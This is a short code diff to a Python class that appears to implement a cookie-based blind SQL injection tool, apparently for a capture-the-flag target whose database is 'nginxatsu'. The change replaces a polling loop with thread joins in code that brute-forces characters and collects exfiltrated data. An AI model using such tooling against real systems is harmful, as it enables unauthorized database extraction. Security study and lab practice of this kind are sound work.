@@ -139,15 +139,14 @@ class cookie_bsqli:
 		r = get_req(self.session, self.url+'api/configs/')
 		self.__check_status(r.status_code, pos, ch)
 
+	def __join_thrds(self):
+		for thrd in self.thrds:
+			thrd.join()
+
 	def __sort_data(self):
 		data = dict(sorted(self.exfil_data.items())).values()
 		self.exfil_data = {}
 		return ''.join(list(data))
-
-	def __check_thrds(self):
-		for thrd in self.thrds:
-			while thrd.is_alive():
-				sleep(0.5)
 
 	def inject(self, payload_fstr, brute_sz, ascii_hex=False):
 		ascii_chars = ascii_gen(ascii_hex)
@@ -161,7 +160,7 @@ class cookie_bsqli:
 							self.thrds.remove(thrd)
 				if pos in self.exfil_data.keys():
 					break
-		self.__check_thrds()
+		self.__join_thrds()
 		return self.__sort_data()
 
 # target db = 'nginxatsu'
